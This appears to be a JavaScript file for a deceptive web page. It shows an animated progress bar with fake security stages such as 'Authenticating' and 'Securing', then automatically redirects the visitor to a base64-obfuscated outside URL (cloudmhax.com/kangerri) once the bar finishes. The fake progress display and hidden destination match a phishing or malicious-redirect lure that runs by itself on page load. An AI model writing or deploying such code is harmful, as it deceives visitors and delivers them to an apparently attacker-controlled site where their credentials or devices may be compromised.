(function() {
  'use strict';

  const stages = [
    'Authenticating',
    'Validating',
    'Securing',
    'Configuring',
    'Optimizing',
    'Finalizing',
    'Complete'
  ];

  const progressFill = document.getElementById('progressFill');
  const percentText = document.getElementById('percentText');
  const stageText = document.getElementById('stageText');

  // ─── Base64 Hidden Redirect URL ───
  // aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw== = https://cloudmhax.com/kangerri/
  const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
  const redirectUrl = atob(encodedUrl);

  let progress = 0;
  let currentStage = 0;
  let redirected = false;

  function updateProgress() {
    const remaining = 100 - progress;
    const step = Math.max(0.2, remaining * 0.04 + Math.random() * 0.5);
    progress = Math.min(100, progress + step);

    progressFill.style.width = progress + '%';
    percentText.textContent = Math.floor(progress) + '%';

    const stageIndex = Math.floor((progress / 100) * (stages.length - 1));
    if (stageIndex !== currentStage && stageIndex < stages.length) {
      currentStage = stageIndex;
      stageText.textContent = stages[stageIndex];
    }

    if (progress < 100) {
      requestAnimationFrame(() => setTimeout(updateProgress, 18));
    } else {
      stageText.textContent = 'Complete';
      percentText.textContent = '100%';

      // ─── FAST REDIRECT ───
      if (!redirected) {
        redirected = true;
        setTimeout(function() {
          window.location.href = redirectUrl;
        }, 250);
      }
    }
  }

  setTimeout(updateProgress, 500);
})();